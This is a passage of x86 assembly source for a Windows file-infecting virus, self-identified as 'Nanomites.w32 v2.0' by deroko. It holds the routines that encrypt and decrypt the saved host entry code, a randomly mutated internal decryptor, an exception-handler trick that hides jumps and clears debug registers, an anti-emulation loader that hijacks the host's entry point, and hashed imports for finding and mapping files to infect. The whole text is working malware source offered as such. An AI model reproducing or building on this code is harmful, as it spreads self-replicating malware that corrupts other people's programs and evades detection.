;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; Crypt Routines for old_host (uses same KEYs as in poly engine)
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
crypt1 proc                                      ;
       pushad                                    ;
       lea esi, [ebp+old_host]                   ;
       mov ecx, loader_size/4                    ;
       mov ebx, [ebp+ViriKey]                    ;
       mov edx, [ebp+ViriKeyInc]                 ;
crypt1_loop:                                     ;
       dec ecx                                   ;
       xor dword ptr[esi+ecx*4], ebx             ;
       sub dword ptr[esi+ecx*4], ebx             ;
       add ebx, edx                              ;
       test ecx, ecx                             ;
       nanojmp jmp_jnz, crypt1_loop              ;
                                                 ;
       popad                                     ;
       ret                                       ;
crypt1 endp                                      ;
                                                 ;
crypt2 proc                                      ;
       pushad                                    ;
       lea esi, [ebp+old_host]                   ;
       mov ecx, loader_size/4                    ;
       mov ebx, [ebp+ViriKey]                    ;
       mov edx, [ebp+ViriKeyInc]                 ;
crypt2_loop:                                     ;
       dec ecx                                   ;
       add dword ptr[esi+ecx*4], ebx             ;
       rol dword ptr[esi+ecx*4], 16              ;
       add ebx, edx                              ;
       test ecx, ecx                             ;
       nanojmp jmp_jnz, crypt2_loop              ;
                                                 ;
       popad                                     ;
       ret                                       ;
crypt2 endp                                      ;
                                                 ;
crypt3 proc                                      ;
       pushad                                    ;
       lea esi, [ebp+old_host]                   ;
       mov ecx, loader_size/4                    ;
       mov ebx, [ebp+ViriKey]                    ;
       mov edx, [ebp+ViriKeyInc]                 ;
crypt3_loop:                                     ;
       dec ecx                                   ;
       not dword ptr[esi+ecx*4]                  ;
       xor dword ptr[esi+ecx*4], ebx             ;
       rol dword ptr[esi+ecx*4], 16              ;
       add ebx, edx                              ;
       test ecx, ecx                             ;
       nanojmp jmp_jnz, crypt3_loop              ;
                                                 ;
       popad                                     ;
       ret                                       ;
crypt3 endp                                      ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
;Decryption routines...
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
decrypt1 proc                                    ;
       pushad                                    ;
       lea esi, [ebp+old_host]                   ;
       mov ecx, loader_size/4                    ;
       mov ebx, [ebp+ViriKey]                    ;
       mov edx, [ebp+ViriKeyInc]                 ;
decrypt1_loop:                                   ;
       dec ecx                                   ;
       add dword ptr[esi+ecx*4], ebx             ;
       xor dword ptr[esi+ecx*4], ebx             ;
       add ebx, edx                              ;
       test ecx, ecx                             ;
       nanojmp jmp_jnz, decrypt1_loop            ;
                                                 ;
       popad                                     ;
       ret                                       ;
decrypt1 endp                                    ;
                                                 ;
decrypt2 proc                                    ;       
       pushad                                    ;
       lea esi, [ebp+old_host]                   ;
       mov ecx, loader_size/4                    ;
       mov ebx, [ebp+ViriKey]                    ;
       mov edx, [ebp+ViriKeyInc]                 ;
decrypt2_loop:                                   ;
       dec ecx                                   ;
       rol dword ptr[esi+ecx*4], 16              ;
       sub dword ptr[esi+ecx*4], ebx             ;
       add ebx, edx                              ;
       test ecx, ecx                             ;
       nanojmp jmp_jnz, decrypt2_loop            ;
                                                 ;
       popad                                     ;
       ret                                       ;
decrypt2 endp                                    ;
                                                 ;
decrypt3 proc                                    ;
       pushad                                    ;
       lea esi, [ebp+old_host]                   ;
       mov ecx, loader_size/4                    ;
       mov ebx, [ebp+ViriKey]                    ;
       mov edx, [ebp+ViriKeyInc]                 ;
decrypt3_loop:                                   ;
       dec ecx                                   ;
       rol dword ptr[esi+ecx*4], 16              ;
       xor dword ptr[esi+ecx*4], ebx             ;
       not dword ptr[esi+ecx*4]                  ;
       add ebx, edx                              ;
       test ecx, ecx                             ;
       nanojmp jmp_jnz, decrypt3_loop            ;
                                                 ;
       popad                                     ;
       ret                                       ;
decrypt3 endp                                    ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; Metamorphic internal decryption... (well it ain't really meta...)
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
MetamorphizeInternal proc                        ;
       pushad                                    ;
       lea esi, [ebp+internals_c]                ;
       lodsd                                     ;
       call brandom32                            ;
       mov ebx, [esi+eax*4]                      ; get internal crypter...
       add ebx, ebp                              ; and align it with delta
       mov [ebp+InternalCrypt], ebx              ; and store aligned
       lea esi, [ebp+internals_d]                ; get list of internal decryptors
       mov esi, [esi+eax*4]                      ; and get rigth one...
       add esi, ebp                              ; align it with delta
       lea edi, [ebp+meta1]                      ; and get in edi place to copy it
       lodsw                                     ;
       stosw                                     ;
       popad                                     ; restore all regs!!!
       ret                                       ; and exit...                                          
MetamorphizeInternal endp                        ;    
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; list of internal crypters/decrypters
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
internals_c:                                     ;
       dd     5                                  ;
       dd     offset internal_crypt1             ;
       dd     offset internal_crypt2             ;
       dd     offset internal_crypt3             ;
       dd     offset internal_crypt4             ;
       dd     offset internal_crypt5             ;
                                                 ;
internals_d:                                     ;
       dd     offset internal_decrypt1           ;
       dd     offset internal_decrypt2           ;
       dd     offset internal_decrypt3           ;
       dd     offset internal_decrypt4           ;
       dd     offset internal_decrypt5           ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
;Internal crypters...
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
internal_crypt1 proc                             ;
intc1:                                           ;
       lodsb                                     ; crypt data for internal
       ror al, cl                                ; decryptor...
       stosb                                     ;
       loop intc1                                ;
       ret                                       ;
internal_crypt1 endp                             ;
                                                 ;
internal_crypt2 proc                             ;
intc2:                                           ;
       lodsb                                     ;
       add al, cl                                ;
       stosb                                     ;
       loop intc2                                ;
       ret                                       ;
internal_crypt2 endp                             ;
                                                 ;
internal_crypt3 proc                             ;
intc3:                                           ;
       lodsb                                     ;
       xor al, cl                                ;
       stosb                                     ;
       loop intc3                                ;
       ret                                       ;
internal_crypt3 endp                             ;
                                                 ;
internal_crypt4 proc                             ;
intc4:                                           ;
       lodsb                                     ;
       sub al, cl                                ;
       stosb                                     ;
       loop intc4                                ;
       ret                                       ;
internal_crypt4 endp                             ;
                                                 ;
internal_crypt5 proc                             ;
intc5:                                           ;
       lodsb                                     ;
       rol al, cl                                ;
       stosb                                     ;
       loop intc5                                ;
       ret                                       ;
internal_crypt5 endp                             ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; internal decryptors, copyied to dec_seh...
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
internal_decrypt1:                               ;
       rol al, cl                                ;
                                                 ;
internal_decrypt2:                               ;
       sub al, cl                                ;
                                                 ;
internal_decrypt3:                               ;
       xor al, cl                                ;
                                                 ;
internal_decrypt4:                               ;
       add al, cl                                ;
                                                 ;
internal_decrypt5:                               ;
       ror al, cl                                ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
;sehhandle - will deal with nanojmp macro ----
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
sehhandle proc    C pException:dword, pFrame:dword, pContext:dword, param:dword
       mov edx, pException                       ;
       mov eax, 1                                ;
       cmp [edx.ER_ExceptionCode], EXCEPTION_BREAKPOINT ;
       jne __exit_handle                         ;
       mov edi, pContext                         ;
       xor esi, esi                              ;
       mov [edi.CONTEXT_Dr0], esi                ; clean debug registers
       mov [edi.CONTEXT_Dr1], esi                ; from SEH
       mov [edi.CONTEXT_Dr2], esi                ;
       mov [edi.CONTEXT_Dr3], esi                ;
                                                 ;
       mov ebx, [edi.CONTEXT_EFlags]             ;
       mov esi, [edi.CONTEXT_Eip]                ;
       inc esi                                   ;
                                                 ;
       xor eax, eax                              ;
       lodsb                                     ;get jmp type
       cmp eax, jmp_jz                           ;
       jne __skip0                               ;
       lodsd                                     ;get address (where to jmp)
       test ebx, 40h                             ;test EFlags
       jnz __follow                              ;
       jmp __notfollow                           ;
__skip0:                                         ;
       cmp eax, jmp_jnz                          ;
       jne __skip1                               ;
       lodsd                                     ;
       test ebx, 40h                             ;
       jz __follow                               ;
       jmp __notfollow                           ;
                                                 ;
__skip1:                                         ;
       cmp eax, jmp_jmp                          ;
       jne __skip2                               ;
       lodsd                                     ;
       jmp __follow                              ;
__skip2:                                         ;
       cmp eax, jmp_jc                           ;
       jne __skip3                               ;
       lodsd                                     ;
       test ebx, 1h                              ;
       jnz __follow                              ;
       jmp __notfollow                           ;
__skip3:                                         ;
       cmp eax, jmp_jnc                          ;
       jne __skip4                               ;
       lodsd                                     ;
       test ebx, 1h                              ;
       jz __follow                               ;
       jmp __notfollow                           ;
__skip4:                                         ;
__notfollow:                                     ;
       add [edi.CONTEXT_Eip], 6h                 ; jmp is not taken so EIP + 6
       xor eax, eax                              ; 6 = size of nanojmp macro
       jmp __exit_handle                         ;
                                                 ;
__follow:                                        ;
       add [edi.CONTEXT_Eip], eax                ; new address (EIP + relative)
       xor  eax, eax                             ;
       jmp  __exit_handle                        ;       
__exit_handle:                                   ;
       ret                                       ;
sehhandle  endp                                  ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
include apizloader_nano.inc                      ; getkernelbase and getprocaddress                                   
check_this:                                      ; till here cheksum is calculated...
include dsrpe32bin.inc                           ; and include poly engine 
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
;Loader, EP will be changed with this
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Loader proc                                      ;
       push offset loader                        ;
patch_loader = dword ptr $-4                     ;
       push dword ptr FS:[0]                     ;
       mov dword ptr FS:[0], esp                 ;
       clc                                       ;
       sbb ecx, ecx                              ;
       div ecx                                   ;
       jmp Quit                                  ; if next instr is emulated fuck it
       ret                                       ; completely
loader:                                          ;       
       mov edx, [esp+00Ch]                       ;
       mov [edx.CONTEXT_Eip], 12345678h          ;
patch_loader_va = dword ptr $-4                  ;
       xor eax, eax                              ;
Quit:                                            ;
       ret                                       ;
Loader endp                                      ;
loader_size = $-Loader                           ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
; needed data...
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
kernel32apis:                                    ;
whash  <GetModuleHandleA, VirtualProtect>        ;
whash  <CreateFileA, CreateFileMappingA>         ;
whash  <MapViewOfFile, UnmapViewOfFile>          ;
whash  <FindFirstFileA, FindNextFileA>           ;
whash  <CloseHandle, CreateThread>               ;
whash  <ExitProcess, TerminateProcess>           ;
whash  <VirtualAlloc, VirtualFree>               ;
whash  <FindClose, WaitForMultipleObjects>       ;
whash  <LoadLibraryA, SetCurrentDirectoryA>      ;
whash  <Sleep, IsDebuggerPresent>                ;
whash  <GetTickCount, GetSystemTime>             ;
kernel32apisnum = ($-kernel32apis)/4             ;
                                                 ;
user32apis:                                      ;
whash  <LoadIconA, LoadCursorA>                  ;
whash  <RegisterClassExA, CreateWindowExA>       ;
whash  <ShowWindow, UpdateWindow>                ;
whash  <GetMessageA, TranslateMessage>           ;
whash  <DispatchMessageA, PostQuitMessage>       ;
whash  <DefWindowProcA, MessageBoxA>             ;
whash  <BeginPaint, GetClientRect>               ;
whash  <DrawTextA, EndPaint>                     ;
user32apisnum = ($-user32apis)/4                 ;
                                                 ;
kernel32             dd     ?                    ;
GetModuleHandleA     dd     ?                    ;
VirtualProtect       dd     ?                    ;
CreateFileA          dd     ?                    ;
CreateFileMappingA   dd     ?                    ;
MapViewOfFile        dd     ?                    ;
UnmapViewOfFile      dd     ?                    ;
FindFirstFileA       dd     ?                    ;
FindNextFileA        dd     ?                    ;
CloseHandle          dd     ?                    ;
CreateThread         dd     ?                    ;
ExitProcess          dd     ?                    ;
TerminateProcess     dd     ?                    ;
VirtualAlloc         dd     ?                    ;
VirtualFree          dd     ?                    ;
FindClose            dd     ?                    ;
WaitForMultipleObjects dd    ?                   ;
LoadLibraryA         dd     ?                    ;
SetCurrentDirectoryA dd     ?                    ;
Sleep                dd     ?                    ;
IsDebuggerPresent    dd     ?                    ;
GetTickCount         dd     ?                    ;
GetSystemTime        dd     ?                    ;
                                                 ;
LoadIconA            dd     ?                    ;
LoadCursorA          dd     ?                    ;
RegisterClassExA     dd     ?                    ;
CreateWindowExA      dd     ?                    ;
ShowWindow           dd     ?                    ;
UpdateWindow         dd     ?                    ;
GetMessageA          dd     ?                    ;
TranslateMessage     dd     ?                    ;
DispatchMessageA     dd     ?                    ;
PostQuitMessage      dd     ?                    ;
DefWindowProcA       dd     ?                    ;
MessageBoxAA         dd     ?                    ;
BeginPaint           dd     ?                    ;
GetClientRect        dd     ?                    ;
DrawTextA            dd     ?                    ;
EndPaint             dd     ?                    ;
                                                 ;
FooBarPacker         dd     ?                    ; callgate to packer proc =)
DecryptHost          dd     ?                    ; decryptor for next generations if file is not packed...
CryptHostAgain       dd     ?                    ; when host is decrypted and copied (encrypt it again)
InternalCrypt        dd     ?                    ;
                                                 ;
s_esp                dd     ?                    ; save ESP from ProgramThread
fd                   dd     ?                    ;
temp                 dd     ?                    ;
memptr               dd     ?                    ;                                                                       
fname                dd     ?                    ;
fsize                dd     ?                    ;
old_fsize            dd     ?                    ;
packed               dd     ?                    ;
entry_raw            dd     ?                    ;
entry_rva            dd     ?                    ;
CheckSum             dd     ?                    ; calcualted in first generation...
dummy                dd     ?                    ;
                                                 ;
hThread1             dd     ?                    ;
hThread2             dd     ?                    ;
hThread3             dd     ?                    ;
hThread4             dd     ?                    ;
nano_initialized     dd     ?                    ;
program_end          dd     ?                    ;
                                                 ;
ViriKey              dd     ?                    ; random virus Key
ViriKeyInc           dd     ?                    ; random number to increment Viri Key... 
                                                 ; 
nthdr                dd     ?                    ;
sectionEP            dd     ?                    ;
OldEntryPoint        dd     ?                    ;
CurrentEntryPoint    dd     ?                    ;
random_seed          dd     ?                    ;
wfdptr               dd     ?                    ;
dummy2               dd     ?                    ;
align 4                                          ; make sure it is dword aligned
old_host             db     loader_size dup(0)   ; Old host...
align 4                                          ; make sure it's size is mod 4
                                                 ;
systime              SYSTEMTIME  <0>             ;
viritext             dd     ?                    ;
hInst                dd     ?                    ;
hWnd                 dd     ?                    ;
wc                   WNDCLASSEX  <0>             ;
msg                  MSG         <0>             ;
ps                   PAINTSTRUCT <0>             ;
rect                 RECT        <0>             ;
crypt_end:                                       ; internal encryption ends here
generation           dd     ?                    ;
nano_end:                                        ;
                                                 ;
firstgen:                                        ;
       push 0                                    ; blah, dummy message for
       push offset mTitle                        ; the 1st generations...
       push offset mText                         ;
       push 0                                    ;
       callW MessageBoxA                         ;
       push 0                                    ;
       calle ExitProcess                         ;
mTitle db "Nanomites.w32 v2.0",0                 ;
mText  db "You started 1st generation of nano "  ;
       db "virus... by deroko",0                 ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
end    __start                                   ;
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                       